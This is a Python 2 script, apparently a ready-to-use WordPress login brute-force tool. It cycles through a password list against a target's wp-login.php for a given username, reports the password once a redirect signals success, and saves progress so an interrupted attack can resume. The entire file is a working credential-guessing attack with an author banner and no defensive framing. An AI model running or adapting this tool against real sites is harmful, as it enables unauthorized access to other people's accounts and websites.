#!/usr/bin/python
#coding:utf-8
import argparse
import requests
from urlparse import urlparse

def reportarError(error):
    print """[*] ERROR!

If favorite , reporta The error:

{bars}
{error}
{bars}

https://t.me/mrar1yan

Thank you for your collaboration!
""".format(error=error.message, bars="-"*len(error.message))


def attack(target, user, passlist, restore = False):

    target = urlparse(target)

    if target.scheme == "":
        target = "http://{}".format(target.geturl())
    else:
        target = target.geturl()

    print "Target: {}\n".format(target)

    passlist = open(passlist, 'r')
    passlist = passlist.readlines()

    iteration = open('iteration.txt','a+')
    iteration.seek(0,0)
    content_iteration = iteration.readlines()

    if len(content_iteration) == 0:
        iteration.write("1\n")
        iteration.close()
        
    iteration = open('iteration.txt','r+')
    content_iteration = iteration.readlines()
    iteration.close()

    aux = passlist
    cont = 1
    Found = False

    if restore:
        print "[*] Restoring Attack\n"
        last_value_iteration = int(str(content_iteration[len(content_iteration)-1]).strip())
        aux = aux[last_value_iteration-1:]
        if len(aux) == 0:
            cont = 1
            aux = passlist
        else:
            cont = last_value_iteration

    
    for password in aux:
        with open('iteration.txt','w') as iteration:
            try:
                cabeceras = {
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain"
                }

                payload = {
                    'log': user.strip(),
                    'pwd': password.strip()
                }

                response = requests.post(target, data=payload, headers=cabeceras, allow_redirects=False)

                if response.status_code in [302, 303]:
                    print '%d-%s  <----- Found :)' % (cont,password.strip())
                    cont = 0
                    Found = True
                    break
                elif response.status_code == 200:
                    print '%d-%s Not Found :(' % (cont,password.strip())
                else:
                    print 'Error!!!!'

            except KeyboardInterrupt:
                print '\n Execution terminated by keyboard '
                cont -= 1
                exit()
            except Exception as e:
                reportarError(e)
                exit()
            finally:
                cont += 1
                iteration.write(str(cont)+'\n')

    if not Found:
        print "\ Could not find the password.Sorry :(\n"


def conexion():
    parser = argparse.ArgumentParser(
            usage="./Wpb.py -t [target] -u [user] -w [passlist]",
            add_help=False,        
    )
    parser.add_argument("-h", "--help", action="help", help=" How User This Tool ")
    parser.add_argument("-t", dest='target', help="For Example : localhost/wordpress/wp-login.php")
    parser.add_argument("-u", dest='user', help="username 0f Target")
    parser.add_argument("-w", dest='passlist', help="address passlist for brute force")
    parser.add_argument("-r", dest='restore', action="store_true", help="Restore the last session of the attack")
    args = parser.parse_args()
    
    authors = ['@mrar1yan']
    collaborators = ['@mrar1yan']

    print """
 __      ____________                             
/  \    /  \______   \                            
\   \/\/   /|     ___/                            
 \        / |    |                                
  \__/\  /  |____|                                
       \/                                         
      __________                __                
      \______   \_______ __ ___/  |_  ____        
       |    |  _/\_  __ \  |  \   __\/ __ \       
       |    |   \ |  | \/  |  /|  | \  ___/       
       |______  / |__|  |____/ |__|  \___  >      
              \/                         \/       
              ___________                         
              \_   _____/__________   ____  ____  
               |    __)/  _ \_  __ \_/ ___\/ __ \ 
               |     \(  <_> )  | \/\  \__\  ___/ 
               \___  / \____/|__|    \___  >___  >
                   \/                    \/    \/ 
 [-][-][-][-][-][-][-][-][-][-]                                                
 [-] Coded By : DeMoN	    [-]
 [-] Site : Guardiran.org   [-]
 [-] Tel : DarkCod3r        [-]
 [-][-][-][-][-][-][-][-][-][-]
 

 
    """.format(
        authors=', '.join(authors),
        collaborators=', '.join(collaborators)
    )
    
    if args.target and args.user and args.passlist:
        attack(args.target, args.user, args.passlist, args.restore)
    else:
        parser.print_help()


if __name__ == '__main__':
    conexion()
